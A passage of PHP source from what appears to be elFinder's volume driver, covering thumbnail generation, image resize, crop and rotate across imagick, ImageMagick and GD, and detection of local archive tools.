        if ($this->tmbURL && $this->tmbPath) {
            if (strpos($path, $this->tmbPath) === 0) {
                return basename($path);
            }
            $name = $this->tmbname($stat);
            $tmb = $this->tmbPath . DIRECTORY_SEPARATOR . $name;
            if (file_exists($tmb)) {
                if ($this->options['tmbGcMaxlifeHour'] && $this->options['tmbGcPercentage'] > 0) {
                    touch($tmb);
                }
                return $name;
            }
        }
        return false;
    }

    protected function canCreateTmb($path, $stat, $checkTmbPath = true)
    {
        static $gdMimes = null;
        static $imgmgPS = null;
        if ($gdMimes === null) {
            $_mimes = array('image/jpeg', 'image/png', 'image/gif', 'image/x-ms-bmp');
            if (function_exists('imagecreatefromwebp')) {
                $_mimes[] = 'image/webp';
            }
            $gdMimes = array_flip($_mimes);
            $imgmgPS = array_flip(array('application/postscript', 'application/pdf'));
        }
        if ((!$checkTmbPath || $this->tmbPathWritable)
            && (!$this->tmbPath || strpos($path, $this->tmbPath) === false)
        ) {
            $mime = strtolower($stat['mime']);
            list($type) = explode('/', $mime);
            if (!empty($this->imgConverter)) {
                if (isset($this->imgConverter[$mime])) {
                    return true;
                }
                if (isset($this->imgConverter[$type])) {
                    return true;
                }
            }
            return $this->imgLib
                && (
                    ($type === 'image' && ($this->imgLib === 'gd' ? isset($gdMimes[$stat['mime']]) : true))
                    ||
                    (ELFINDER_IMAGEMAGICK_PS && isset($imgmgPS[$stat['mime']]) && $this->imgLib !== 'gd')
                );
        }
        return false;
    }

    protected function canResize($path, $stat)
    {
        return $this->canCreateTmb($path, $stat, false);
    }

    protected function createTmb($path, $stat)
    {
        if (!$stat || !$this->canCreateTmb($path, $stat)) {
            return false;
        }
        $name = $this->tmbname($stat);
        $tmb = $this->tmbPath . DIRECTORY_SEPARATOR . $name;
        $maxlength = -1;
        $imgConverter = null;
        $mime = strtolower($stat['mime']);
        list($type) = explode('/', $mime);
        if (isset($this->imgConverter[$mime])) {
            $imgConverter = $this->imgConverter[$mime]['func'];
            if (!empty($this->imgConverter[$mime]['maxlen'])) {
                $maxlength = intval($this->imgConverter[$mime]['maxlen']);
            }
        } else if (isset($this->imgConverter[$type])) {
            $imgConverter = $this->imgConverter[$type]['func'];
            if (!empty($this->imgConverter[$type]['maxlen'])) {
                $maxlength = intval($this->imgConverter[$type]['maxlen']);
            }
        }
        if ($imgConverter && !is_callable($imgConverter)) {
            return false;
        }
        if (($src = $this->fopenCE($path, 'rb')) == false) {
            return false;
        }
        if (($trg = fopen($tmb, 'wb')) == false) {
            $this->fcloseCE($src, $path);
            return false;
        }
        stream_copy_to_stream($src, $trg, $maxlength);
        $this->fcloseCE($src, $path);
        fclose($trg);
        if ($imgConverter) {
            if (!call_user_func_array($imgConverter, array($tmb, $stat, $this))) {
                file_exists($tmb) && unlink($tmb);
                return false;
            }
        }
        $result = false;
        $tmbSize = $this->tmbSize;
        if ($this->imgLib === 'imagick') {
            try {
                $imagickTest = new imagick($tmb . '[0]');
                $imagickTest->clear();
                $imagickTest = true;
            } catch (Exception $e) {
                $imagickTest = false;
            }
        }
        if (($this->imgLib === 'imagick' && !$imagickTest) || ($s = getimagesize($tmb)) === false) {
            if ($this->imgLib === 'imagick') {
                $bgcolor = $this->options['tmbBgColor'];
                if ($bgcolor === 'transparent') {
                    $bgcolor = 'rgba(255, 255, 255, 0.0)';
                }
                try {
                    $imagick = new imagick();
                    $imagick->setBackgroundColor(new ImagickPixel($bgcolor));
                    $imagick->readImage($this->getExtentionByMime($stat['mime'], ':') . $tmb . '[0]');
                    try {
                        $imagick->trimImage(0);
                    } catch (Exception $e) {
                    }
                    $imagick->setImageFormat('png');
                    $imagick->writeImage($tmb);
                    $imagick->clear();
                    if (($s = getimagesize($tmb)) !== false) {
                        $result = true;
                    }
                } catch (Exception $e) {
                }
            } else if ($this->imgLib === 'convert') {
                $convParams = $this->imageMagickConvertPrepare($tmb, 'png', 100, array(), $stat['mime']);
                $cmd = sprintf('%s -colorspace sRGB -trim -- %s %s', ELFINDER_CONVERT_PATH, $convParams['quotedPath'], $convParams['quotedDstPath']);
                $result = false;
                if ($this->procExec($cmd) === 0) {
                    if (($s = getimagesize($tmb)) !== false) {
                        $result = true;
                    }
                }
            }
            if (!$result) {
                if (function_exists('gd_info') && ($s = getimagesize($tmb))) {
                    $this->imgLib = 'gd';
                } else {
                    file_exists($tmb) && unlink($tmb);
                    return false;
                }
            }
        }
        if ($s[0] <= $tmbSize && $s[1] <= $tmbSize) {
            $result = $this->imgSquareFit($tmb, $tmbSize, $tmbSize, 'center', 'middle', $this->options['tmbBgColor'], 'png');
        } else {
            if ($this->options['tmbCrop']) {
                $result = $tmb;
                if (!(($s[0] > $tmbSize && $s[1] <= $tmbSize) || ($s[0] <= $tmbSize && $s[1] > $tmbSize)) || ($s[0] > $tmbSize && $s[1] > $tmbSize)) {
                    $result = $this->imgResize($tmb, $tmbSize, $tmbSize, true, false, 'png');
                }
                if ($result && ($s = getimagesize($tmb)) != false) {
                    $x = $s[0] > $tmbSize ? intval(($s[0] - $tmbSize) / 2) : 0;
                    $y = $s[1] > $tmbSize ? intval(($s[1] - $tmbSize) / 2) : 0;
                    $result = $this->imgCrop($result, $tmbSize, $tmbSize, $x, $y, 'png');
                } else {
                    $result = false;
                }
            } else {
                $result = $this->imgResize($tmb, $tmbSize, $tmbSize, true, true, 'png');
            }
            if ($result) {
                if ($s = getimagesize($tmb)) {
                    if ($s[0] !== $tmbSize || $s[1] !== $tmbSize) {
                        $result = $this->imgSquareFit($result, $tmbSize, $tmbSize, 'center', 'middle', $this->options['tmbBgColor'], 'png');
                    }
                }
            }
        }
        if (!$result) {
            unlink($tmb);
            return false;
        }
        return $name;
    }

    protected function imgResize($path, $width, $height, $keepProportions = false, $resizeByBiggerSide = true, $destformat = null, $jpgQuality = null, $options = array())
    {
        if (($s = getimagesize($path)) == false) {
            return false;
        }
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        list($orig_w, $orig_h) = array($s[0], $s[1]);
        list($size_w, $size_h) = array($width, $height);
        if (empty($options['unenlarge']) || $orig_w > $size_w || $orig_h > $size_h) {
            if ($keepProportions == true) {
                if ($resizeByBiggerSide) {
                    if ($orig_w > $orig_h) {
                        $size_h = round($orig_h * $width / $orig_w);
                        $size_w = $width;
                    } else {
                        $size_w = round($orig_w * $height / $orig_h);
                        $size_h = $height;
                    }
                } else {
                    if ($orig_w > $orig_h) {
                        $size_w = round($orig_w * $height / $orig_h);
                        $size_h = $height;
                    } else {
                        $size_h = round($orig_h * $width / $orig_w);
                        $size_w = $width;
                    }
                }
            }
        } else {
            $size_w = $orig_w;
            $size_h = $orig_h;
        }
        elFinder::extendTimeLimit(300);
        switch ($this->imgLib) {
            case 'imagick':
                try {
                    $img = new imagick($path);
                } catch (Exception $e) {
                    return false;
                }
                $filter = ($destformat === 'png') ? Imagick::FILTER_BOX : Imagick::FILTER_LANCZOS;
                $ani = ($img->getNumberImages() > 1);
                if ($ani && is_null($destformat)) {
                    $img = $img->coalesceImages();
                    do {
                        $img->resizeImage($size_w, $size_h, $filter, 1);
                    } while ($img->nextImage());
                    $img->optimizeImageLayers();
                    $result = $img->writeImages($path, true);
                } else {
                    if ($ani) {
                        $img->setFirstIterator();
                    }
                    if (strtoupper($img->getImageFormat()) === 'JPEG') {
                        $img->setImageCompression(imagick::COMPRESSION_JPEG);
                        $img->setImageCompressionQuality($jpgQuality);
                        if (isset($options['preserveExif']) && !$options['preserveExif']) {
                            try {
                                $orientation = $img->getImageOrientation();
                            } catch (ImagickException $e) {
                                $orientation = 0;
                            }
                            $img->stripImage();
                            if ($orientation) {
                                $img->setImageOrientation($orientation);
                            }
                        }
                        if ($this->options['jpgProgressive']) {
                            $img->setInterlaceScheme(Imagick::INTERLACE_PLANE);
                        }
                    }
                    $img->resizeImage($size_w, $size_h, $filter, true);
                    if ($destformat) {
                        $result = $this->imagickImage($img, $path, $destformat, $jpgQuality);
                    } else {
                        $result = $img->writeImage($path);
                    }
                }
                $img->clear();
                return $result ? $path : false;
                break;
            case 'convert':
                extract($this->imageMagickConvertPrepare($path, $destformat, $jpgQuality, $s));
                $filter = ($destformat === 'png') ? '-filter Box' : '-filter Lanczos';
                $strip = (isset($options['preserveExif']) && !$options['preserveExif']) ? ' -strip' : '';
                $cmd = sprintf('%s %s%s%s%s%s %s -geometry %dx%d! %s %s', ELFINDER_CONVERT_PATH, $quotedPath, $coalesce, $jpgQuality, $strip, $interlace, $filter, $size_w, $size_h, $deconstruct, $quotedDstPath);
                $result = false;
                if ($this->procExec($cmd) === 0) {
                    $result = true;
                }
                return $result ? $path : false;
                break;
            case 'gd':
                elFinder::expandMemoryForGD(array($s, array($size_w, $size_h)));
                $img = $this->gdImageCreate($path, $s['mime']);
                if ($img && false != ($tmp = imagecreatetruecolor($size_w, $size_h))) {
                    $bgNum = false;
                    if ($s[2] === IMAGETYPE_GIF && (!$destformat || $destformat === 'gif')) {
                        $bgIdx = imagecolortransparent($img);
                        if ($bgIdx !== -1) {
                            $c = imagecolorsforindex($img, $bgIdx);
                            $bgNum = imagecolorallocate($tmp, $c['red'], $c['green'], $c['blue']);
                            imagefill($tmp, 0, 0, $bgNum);
                            imagecolortransparent($tmp, $bgNum);
                        }
                    }
                    if ($bgNum === false) {
                        $this->gdImageBackground($tmp, 'transparent');
                    }
                    if (!imagecopyresampled($tmp, $img, 0, 0, 0, 0, $size_w, $size_h, $s[0], $s[1])) {
                        return false;
                    }
                    $result = $this->gdImage($tmp, $path, $destformat, $s['mime'], $jpgQuality);
                    imagedestroy($img);
                    imagedestroy($tmp);
                    return $result ? $path : false;
                }
                break;
        }
        return false;
    }

    protected function imgCrop($path, $width, $height, $x, $y, $destformat = null, $jpgQuality = null)
    {
        if (($s = getimagesize($path)) == false) {
            return false;
        }
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        elFinder::extendTimeLimit(300);
        switch ($this->imgLib) {
            case 'imagick':
                try {
                    $img = new imagick($path);
                } catch (Exception $e) {
                    return false;
                }
                $ani = ($img->getNumberImages() > 1);
                if ($ani && is_null($destformat)) {
                    $img = $img->coalesceImages();
                    do {
                        $img->setImagePage($s[0], $s[1], 0, 0);
                        $img->cropImage($width, $height, $x, $y);
                        $img->setImagePage($width, $height, 0, 0);
                    } while ($img->nextImage());
                    $img->optimizeImageLayers();
                    $result = $img->writeImages($path, true);
                } else {
                    if ($ani) {
                        $img->setFirstIterator();
                    }
                    $img->setImagePage($s[0], $s[1], 0, 0);
                    $img->cropImage($width, $height, $x, $y);
                    $img->setImagePage($width, $height, 0, 0);
                    $result = $this->imagickImage($img, $path, $destformat, $jpgQuality);
                }
                $img->clear();
                return $result ? $path : false;
                break;
            case 'convert':
                extract($this->imageMagickConvertPrepare($path, $destformat, $jpgQuality, $s));
                $cmd = sprintf('%s %s%s%s%s -crop %dx%d+%d+%d%s %s', ELFINDER_CONVERT_PATH, $quotedPath, $coalesce, $jpgQuality, $interlace, $width, $height, $x, $y, $deconstruct, $quotedDstPath);
                $result = false;
                if ($this->procExec($cmd) === 0) {
                    $result = true;
                }
                return $result ? $path : false;
                break;
            case 'gd':
                elFinder::expandMemoryForGD(array($s, array($width, $height)));
                $img = $this->gdImageCreate($path, $s['mime']);
                if ($img && false != ($tmp = imagecreatetruecolor($width, $height))) {
                    $bgNum = false;
                    if ($s[2] === IMAGETYPE_GIF && (!$destformat || $destformat === 'gif')) {
                        $bgIdx = imagecolortransparent($img);
                        if ($bgIdx !== -1) {
                            $c = imagecolorsforindex($img, $bgIdx);
                            $bgNum = imagecolorallocate($tmp, $c['red'], $c['green'], $c['blue']);
                            imagefill($tmp, 0, 0, $bgNum);
                            imagecolortransparent($tmp, $bgNum);
                        }
                    }
                    if ($bgNum === false) {
                        $this->gdImageBackground($tmp, 'transparent');
                    }
                    $size_w = $width;
                    $size_h = $height;
                    if ($s[0] < $width || $s[1] < $height) {
                        $size_w = $s[0];
                        $size_h = $s[1];
                    }
                    if (!imagecopy($tmp, $img, 0, 0, $x, $y, $size_w, $size_h)) {
                        return false;
                    }
                    $result = $this->gdImage($tmp, $path, $destformat, $s['mime'], $jpgQuality);
                    imagedestroy($img);
                    imagedestroy($tmp);
                    return $result ? $path : false;
                }
                break;
        }
        return false;
    }

    protected function imgSquareFit($path, $width, $height, $align = 'center', $valign = 'middle', $bgcolor = '#0000ff', $destformat = null, $jpgQuality = null)
    {
        if (($s = getimagesize($path)) == false) {
            return false;
        }
        $result = false;
        $y = ceil(abs($height - $s[1]) / 2);
        $x = ceil(abs($width - $s[0]) / 2);
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        elFinder::extendTimeLimit(300);
        switch ($this->imgLib) {
            case 'imagick':
                try {
                    $img = new imagick($path);
                } catch (Exception $e) {
                    return false;
                }
                if ($bgcolor === 'transparent') {
                    $bgcolor = 'rgba(255, 255, 255, 0.0)';
                }
                $ani = ($img->getNumberImages() > 1);
                if ($ani && is_null($destformat)) {
                    $img1 = new Imagick();
                    $img1->setFormat('gif');
                    $img = $img->coalesceImages();
                    do {
                        $gif = new Imagick();
                        $gif->newImage($width, $height, new ImagickPixel($bgcolor));
                        $gif->setImageColorspace($img->getImageColorspace());
                        $gif->setImageFormat('gif');
                        $gif->compositeImage($img, imagick::COMPOSITE_OVER, $x, $y);
                        $gif->setImageDelay($img->getImageDelay());
                        $gif->setImageIterations($img->getImageIterations());
                        $img1->addImage($gif);
                        $gif->clear();
                    } while ($img->nextImage());
                    $img1->optimizeImageLayers();
                    $result = $img1->writeImages($path, true);
                } else {
                    if ($ani) {
                        $img->setFirstIterator();
                    }
                    $img1 = new Imagick();
                    $img1->newImage($width, $height, new ImagickPixel($bgcolor));
                    $img1->setImageColorspace($img->getImageColorspace());
                    $img1->compositeImage($img, imagick::COMPOSITE_OVER, $x, $y);
                    $result = $this->imagickImage($img1, $path, $destformat, $jpgQuality);
                }
                $img1->clear();
                $img->clear();
                return $result ? $path : false;
                break;
            case 'convert':
                extract($this->imageMagickConvertPrepare($path, $destformat, $jpgQuality, $s));
                if ($bgcolor === 'transparent') {
                    $bgcolor = 'rgba(255, 255, 255, 0.0)';
                }
                $cmd = sprintf('%s -size %dx%d %s png:- | convert%s%s%s png:-  %s -geometry +%d+%d -compose over -composite%s %s', ELFINDER_CONVERT_PATH, $width, $height, escapeshellarg('xc:' . $bgcolor), $coalesce, $jpgQuality, $interlace, $quotedPath, $x, $y, $deconstruct, $quotedDstPath);
                $result = false;
                if ($this->procExec($cmd) === 0) {
                    $result = true;
                }
                return $result ? $path : false;
                break;
            case 'gd':
                elFinder::expandMemoryForGD(array($s, array($width, $height)));
                $img = $this->gdImageCreate($path, $s['mime']);
                if ($img && false != ($tmp = imagecreatetruecolor($width, $height))) {
                    $this->gdImageBackground($tmp, $bgcolor);
                    if ($bgcolor === 'transparent' && ($destformat === 'png' || $s[2] === IMAGETYPE_PNG)) {
                        $bgNum = imagecolorallocatealpha($tmp, 255, 255, 255, 127);
                        imagefill($tmp, 0, 0, $bgNum);
                    }
                    if (!imagecopy($tmp, $img, $x, $y, 0, 0, $s[0], $s[1])) {
                        return false;
                    }
                    $result = $this->gdImage($tmp, $path, $destformat, $s['mime'], $jpgQuality);
                    imagedestroy($img);
                    imagedestroy($tmp);
                    return $result ? $path : false;
                }
                break;
        }
        return false;
    }

    protected function imgRotate($path, $degree, $bgcolor = '#ffffff', $destformat = null, $jpgQuality = null)
    {
        if (($s = getimagesize($path)) == false || $degree % 360 === 0) {
            return false;
        }
        $result = false;
        if ($degree % 90 === 0 && in_array($s[2], array(IMAGETYPE_JPEG, IMAGETYPE_JPEG2000))) {
            $count = ($degree / 90) % 4;
            $exiftran = array(1 => '-9', 2 => '-1', 3 => '-2');
            $jpegtran = array(1 => '90', 2 => '180', 3 => '270');
            $quotedPath = escapeshellarg($path);
            $cmds = array();
            if ($this->procExec(ELFINDER_EXIFTRAN_PATH . ' -h') === 0) {
                $cmds[] = ELFINDER_EXIFTRAN_PATH . ' -i ' . $exiftran[$count] . ' -- ' . $quotedPath;
            }
            if ($this->procExec(ELFINDER_JPEGTRAN_PATH . ' -version') === 0) {
                $cmds[] = ELFINDER_JPEGTRAN_PATH . ' -rotate ' . $jpegtran[$count] . ' -copy all -outfile ' . $quotedPath . ' -- ' . $quotedPath;
            }
            foreach ($cmds as $cmd) {
                if ($this->procExec($cmd) === 0) {
                    $result = true;
                    break;
                }
            }
            if ($result) {
                return $path;
            }
        }
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        elFinder::extendTimeLimit(300);
        switch ($this->imgLib) {
            case 'imagick':
                try {
                    $img = new imagick($path);
                } catch (Exception $e) {
                    return false;
                }
                if ($s[2] === IMAGETYPE_GIF || $s[2] === IMAGETYPE_PNG) {
                    $bgcolor = 'rgba(255, 255, 255, 0.0)';
                }
                if ($img->getNumberImages() > 1) {
                    $img = $img->coalesceImages();
                    do {
                        $img->rotateImage(new ImagickPixel($bgcolor), $degree);
                    } while ($img->nextImage());
                    $img->optimizeImageLayers();
                    $result = $img->writeImages($path, true);
                } else {
                    $img->rotateImage(new ImagickPixel($bgcolor), $degree);
                    $result = $this->imagickImage($img, $path, $destformat, $jpgQuality);
                }
                $img->clear();
                return $result ? $path : false;
                break;
            case 'convert':
                extract($this->imageMagickConvertPrepare($path, $destformat, $jpgQuality, $s));
                if ($s[2] === IMAGETYPE_GIF || $s[2] === IMAGETYPE_PNG) {
                    $bgcolor = 'rgba(255, 255, 255, 0.0)';
                }
                $cmd = sprintf('%s%s%s%s -background %s -rotate %d%s -- %s %s', ELFINDER_CONVERT_PATH, $coalesce, $jpgQuality, $interlace, escapeshellarg($bgcolor), $degree, $deconstruct, $quotedPath, $quotedDstPath);
                $result = false;
                if ($this->procExec($cmd) === 0) {
                    $result = true;
                }
                return $result ? $path : false;
                break;
            case 'gd':
                elFinder::expandMemoryForGD(array($s, $s));
                $img = $this->gdImageCreate($path, $s['mime']);
                $degree = 360 - $degree;
                $bgNum = -1;
                $bgIdx = false;
                if ($s[2] === IMAGETYPE_GIF) {
                    $bgIdx = imagecolortransparent($img);
                    if ($bgIdx !== -1) {
                        $c = imagecolorsforindex($img, $bgIdx);
                        $w = imagesx($img);
                        $h = imagesy($img);
                        $newImg = imagecreatetruecolor($w, $h);
                        imagepalettecopy($newImg, $img);
                        $bgNum = imagecolorallocate($newImg, $c['red'], $c['green'], $c['blue']);
                        imagefill($newImg, 0, 0, $bgNum);
                        imagecolortransparent($newImg, $bgNum);
                        imagecopy($newImg, $img, 0, 0, 0, 0, $w, $h);
                        imagedestroy($img);
                        $img = $newImg;
                        $newImg = null;
                    }
                } else if ($s[2] === IMAGETYPE_PNG) {
                    $bgNum = imagecolorallocatealpha($img, 255, 255, 255, 127);
                }
                if ($bgNum === -1) {
                    list($r, $g, $b) = sscanf($bgcolor, "#%02x%02x%02x");
                    $bgNum = imagecolorallocate($img, $r, $g, $b);
                }
                $tmp = imageRotate($img, $degree, $bgNum);
                if ($bgIdx !== -1) {
                    imagecolortransparent($tmp, $bgNum);
                }
                $result = $this->gdImage($tmp, $path, $destformat, $s['mime'], $jpgQuality);
                imageDestroy($img);
                imageDestroy($tmp);
                return $result ? $path : false;
                break;
        }
        return false;
    }

    protected function procExec($command, &$output = '', &$return_var = -1, &$error_output = '', $cwd = null)
    {
        return elFinder::procExec($command, $output, $return_var, $error_output);
    }

    protected function rmTmb($stat)
    {
        if ($this->tmbPathWritable) {
            if ($stat['mime'] === 'directory') {
                foreach ($this->scandirCE($this->decode($stat['hash'])) as $p) {
                    elFinder::extendTimeLimit(30);
                    $name = $this->basenameCE($p);
                    $name != '.' && $name != '..' && $this->rmTmb($this->stat($p));
                }
            } else if (!empty($stat['tmb']) && $stat['tmb'] != "1") {
                $tmb = $this->tmbPath . DIRECTORY_SEPARATOR . rawurldecode($stat['tmb']);
                file_exists($tmb) && unlink($tmb);
                clearstatcache();
            }
        }
    }

    protected function gdImageCreate($path, $mime)
    {
        switch ($mime) {
            case 'image/jpeg': return imagecreatefromjpeg($path);
            case 'image/png': return imagecreatefrompng($path);
            case 'image/gif': return imagecreatefromgif($path);
            case 'image/x-ms-bmp':
                if (!function_exists('imagecreatefrombmp')) {
                    include_once dirname(__FILE__) . '/libs/GdBmp.php';
                }
                return imagecreatefrombmp($path);
            case 'image/xbm': return imagecreatefromxbm($path);
            case 'image/xpm': return imagecreatefromxpm($path);
            case 'image/webp': return imagecreatefromwebp($path);
        }
        return false;
    }

    protected function gdImage($image, $filename, $destformat, $mime, $jpgQuality = null)
    {
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        if ($destformat) {
            switch ($destformat) {
                case 'jpg': $mime = 'image/jpeg'; break;
                case 'gif': $mime = 'image/gif'; break;
                case 'png':
                default: $mime = 'image/png'; break;
            }
        }
        switch ($mime) {
            case 'image/gif': return imagegif($image, $filename);
            case 'image/jpeg':
                if ($this->options['jpgProgressive']) {
                    imageinterlace($image, true);
                }
                return imagejpeg($image, $filename, $jpgQuality);
            case 'image/wbmp': return imagewbmp($image, $filename);
            case 'image/png':
            default: return imagepng($image, $filename);
        }
    }

    protected function imagickImage($img, $filename, $destformat, $jpgQuality = null)
    {
        if (!$jpgQuality) {
            $jpgQuality = $this->options['jpgQuality'];
        }
        try {
            if ($destformat) {
                if ($destformat === 'gif') {
                    $img->setImageFormat('gif');
                } else if ($destformat === 'png') {
                    $img->setImageFormat('png');
                } else if ($destformat === 'jpg') {
                    $img->setImageFormat('jpeg');
                }
            }
            if (strtoupper($img->getImageFormat()) === 'JPEG') {
                $img->setImageCompression(imagick::COMPRESSION_JPEG);
                $img->setImageCompressionQuality($jpgQuality);
                if ($this->options['jpgProgressive']) {
                    $img->setInterlaceScheme(Imagick::INTERLACE_PLANE);
                }
                try {
                    $orientation = $img->getImageOrientation();
                } catch (ImagickException $e) {
                    $orientation = 0;
                }
                $img->stripImage();
                if ($orientation) {
                    $img->setImageOrientation($orientation);
                }
            }
            $result = $img->writeImage($filename);
        } catch (Exception $e) {
            $result = false;
        }
        return $result;
    }

    protected function gdImageBackground($image, $bgcolor)
    {
        if ($bgcolor === 'transparent') {
            imagealphablending($image, false);
            imagesavealpha($image, true);
        } else {
            list($r, $g, $b) = sscanf($bgcolor, "#%02x%02x%02x");
            $bgcolor1 = imagecolorallocate($image, $r, $g, $b);
            imagefill($image, 0, 0, $bgcolor1);
        }
    }

    protected function imageMagickConvertPrepare($path, $destformat, $jpgQuality, $imageSize = null, $mime = null)
    {
        if (is_null($imageSize)) {
            $imageSize = getimagesize($path);
        }
        if (is_null($mime)) {
            $mime = $this->mimetype($path);
        }
        $srcType = $this->getExtentionByMime($mime, ':');
        $ani = false;
        if (preg_match('/^(?:gif|png|ico)/', $srcType)) {
            $cmd = ELFINDER_IDENTIFY_PATH . ' -- ' . escapeshellarg($srcType . $path);
            if ($this->procExec($cmd, $o) === 0) {
                $ani = preg_split('/(?:\r\n|\n|\r)/', trim($o));
                if (count($ani) < 2) {
                    $ani = false;
                }
            }
        }
        $coalesce = $index = $interlace = '';
        $deconstruct = ' +repage';
        if ($ani && $destformat !== 'png') {
            if (is_null($destformat)) {
                $coalesce = ' -coalesce -repage 0x0';
                $deconstruct = ' +repage -deconstruct -layers optimize';
            } else if ($imageSize) {
                if ($srcType === 'ico:') {
                    $index = '[0]';
                    foreach ($ani as $_i => $_info) {
                        if (preg_match('/ (\d+)x(\d+) /', $_info, $m)) {
                            if ($m[1] == $imageSize[0] && $m[2] == $imageSize[1]) {
                                $index = '[' . $_i . ']';
                                break;
                            }
                        }
                    }
                }
            }
        } else {
            $index = '[0]';
        }
        if ($imageSize && ($imageSize[2] === IMAGETYPE_JPEG || $imageSize[2] === IMAGETYPE_JPEG2000)) {
            $jpgQuality = ' -quality ' . $jpgQuality;
            if ($this->options['jpgProgressive']) {
                $interlace = ' -interlace Plane';
            }
        } else {
            $jpgQuality = '';
        }
        $quotedPath = escapeshellarg($srcType . $path . $index);
        $quotedDstPath = escapeshellarg(($destformat ? ($destformat . ':') : $srcType) . $path);
        return compact('ani', 'index', 'coalesce', 'deconstruct', 'jpgQuality', 'quotedPath', 'quotedDstPath', 'interlace');
    }

    protected function stripos($haystack, $needle, $offset = 0)
    {
        if (function_exists('mb_stripos')) {
            return mb_stripos($haystack, $needle, $offset, 'UTF-8');
        } else if (function_exists('mb_strtolower') && function_exists('mb_strpos')) {
            return mb_strpos(mb_strtolower($haystack, 'UTF-8'), mb_strtolower($needle, 'UTF-8'), $offset);
        }
        return stripos($haystack, $needle, $offset);
    }

    protected function searchMatchName($name, $query, $path)
    {
        return $this->stripos($name, $query) !== false;
    }

    protected function getArchivers($use_cache = true)
    {
        $sessionKey = 'archivers';
        if ($use_cache) {
            if (isset($this->options['archivers']) && is_array($this->options['archivers']) && $this->options['archivers']) {
                $cache = $this->options['archivers'];
            } else {
                $cache = elFinder::$archivers;
            }
            if ($cache) {
                return $cache;
            } else {
                if ($cache = $this->session->get($sessionKey, array())) {
                    return elFinder::$archivers = $cache;
                }
            }
        }
        $arcs = array('create' => array(), 'extract' => array());
        if ($this->procExec('') === 0) {
            $this->procExec(ELFINDER_TAR_PATH . ' --version', $o, $ctar);
            if ($ctar == 0) {
                $arcs['create']['application/x-tar'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-chf', 'ext' => 'tar');
                $arcs['extract']['application/x-tar'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-xf', 'ext' => 'tar', 'toSpec' => '-C ', 'getsize' => array('argc' => '-xvf', 'toSpec' => '--to-stdout|wc -c', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]*([0-9]+)[^\r\n]*$/s', 'replace' => '$1'));
                unset($o);
                $this->procExec(ELFINDER_GZIP_PATH . ' --version', $o, $c);
                if ($c == 0) {
                    $arcs['create']['application/x-gzip'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-czhf', 'ext' => 'tgz');
                    $arcs['extract']['application/x-gzip'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-xzf', 'ext' => 'tgz', 'toSpec' => '-C ', 'getsize' => array('argc' => '-xvf', 'toSpec' => '--to-stdout|wc -c', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]*([0-9]+)[^\r\n]*$/s', 'replace' => '$1'));
                }
                unset($o);
                $this->procExec(ELFINDER_BZIP2_PATH . ' --version', $o, $c);
                if ($c == 0) {
                    $arcs['create']['application/x-bzip2'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-cjhf', 'ext' => 'tbz');
                    $arcs['extract']['application/x-bzip2'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-xjf', 'ext' => 'tbz', 'toSpec' => '-C ', 'getsize' => array('argc' => '-xvf', 'toSpec' => '--to-stdout|wc -c', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]*([0-9]+)[^\r\n]*$/s', 'replace' => '$1'));
                }
                unset($o);
                $this->procExec(ELFINDER_XZ_PATH . ' --version', $o, $c);
                if ($c == 0) {
                    $arcs['create']['application/x-xz'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-cJhf', 'ext' => 'xz');
                    $arcs['extract']['application/x-xz'] = array('cmd' => ELFINDER_TAR_PATH, 'argc' => '-xJf', 'ext' => 'xz', 'toSpec' => '-C ', 'getsize' => array('argc' => '-xvf', 'toSpec' => '--to-stdout|wc -c', 'regex' => '/^.+(?:\r\n|\n|\r)[^\r\n0-9]*([0-9]+)[^\r\n]*$/s', 'replace' => '$1'));
                }
            }
            unset($o);
            $this->procExec(ELFINDER_ZIP_PATH . ' -h', $o, $c);
            if ($c == 0) {
                $arcs['create']['application/zip'] = array('cmd' => ELFINDER_ZIP_PATH, 'argc' => '-r9 -q', 'ext' => 'zip');
            }
            unset($o);
            $this->procExec(ELFINDER_UNZIP_PATH . ' --help', $o, $c);
            if ($c == 0) {
                $arcs['extract']['application/zip'] = array('cmd' => ELFINDER_UNZIP_PATH, 'argc' => '-q', 'ext' => 'zip', 'toSpec' => '-d ', 'getsize' => array('argc' => '-Z -t', 'regex' => '/^.+?,\s?([0-9]+).+$/', 'replace' => '$1'));
            }
            unset($o);
            $this->procExec(ELFINDER_RAR_PATH, $o, $c);
            if ($c == 0 || $c == 7) {
                $arcs['create']['application/x-rar'] = array('cmd' => ELFINDER_RAR_PATH, 'argc' => 'a -inul' . (defined('ELFINDER_RAR_MA4') && ELFINDER_RAR_MA4? ' -ma4' : '') . ' --', 'ext' => 'rar');
            }
            unset($o);
            $this->procExec(ELFINDER_UNRAR_PATH, $o, $c);
            if ($c == 0 || $c == 7) {
                $arcs['extract']['application/x-rar'] = array('cmd' => ELFINDER_UNRAR_PATH, 'argc' => 'x -y', 'ext' => 'rar', 'toSpec' => '', 'getsize' => array('argc' => 'l', 'regex' => '/^.+(?:\r\n|\n|\r)(?:(?:[^\r\n0-9]+[0-9]+[^\r\n0-9]+([0-9]+)[^\r\n]+)|(?:[^\r\n0-9]+([0-9]+)[^\r\n0-9]+[0-9]+[^\r\n]*))$/s', 'replace' => '$1'));
            }
            unset($o);
            $this->procExec(ELFINDER_7Z_PATH, $o, $c);
            if ($c == 0) {
                $arcs['create']['application/x-7z-compressed'] = array('cmd' => ELFINDER_7Z_PATH, 'argc' => 'a --', 'ext' => '7z');
